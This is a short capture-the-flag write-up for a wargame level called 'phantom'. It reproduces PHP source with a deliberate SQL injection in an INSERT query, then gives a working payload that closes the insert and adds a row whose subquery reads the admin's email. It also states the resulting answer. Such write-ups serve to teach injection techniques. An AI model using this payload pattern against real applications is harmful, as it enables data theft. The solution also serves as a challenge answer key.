# phantom

```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect("phantom");

  if($_GET['joinmail']){
    if(preg_match('/duplicate/i', $_GET['joinmail'])) exit("nice try");
    $query = "insert into prob_phantom values(0,'{$_SERVER[REMOTE_ADDR]}','{$_GET[joinmail]}')";
    mysqli_query($db,$query);
    echo "<hr>query : <strong>{$query}</strong><hr>";
  }

  $rows = mysqli_query($db,"select no,ip,email from prob_phantom where no=1 or ip='{$_SERVER[REMOTE_ADDR]}'");
  echo "<table border=1><tr><th>ip</th><th>email</th></tr>";
    while(($result = mysqli_fetch_array($rows))){
    if($result['no'] == 1) $result['email'] = "**************";
    echo "<tr><td>{$result[ip]}</td><td>".htmlentities($result[email])."</td></tr>";
  }
  echo "</table>";

  $_GET[email] = addslashes($_GET[email]);
  $query = "select email from prob_phantom where no=1 and email='{$_GET[email]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['email']) && ($result['email'] === $_GET['email'])){ mysqli_query($db,"delete from prob_phantom where no != 1"); solve("phantom"); }
  highlight_file(__FILE__);
?>
```

Here we have to find the email of admin. We are injecting in an Insert query. So we have to first close the first insert query using `')` then we can start give another 3 values to insert and in that email part we can select the email with no=1

payload : `90'),(0,'103.149.158.165',(select * from(select email from prob_phantom where no=1)x))--+`

It will give the email `admin_secure_email@rubiya.kr`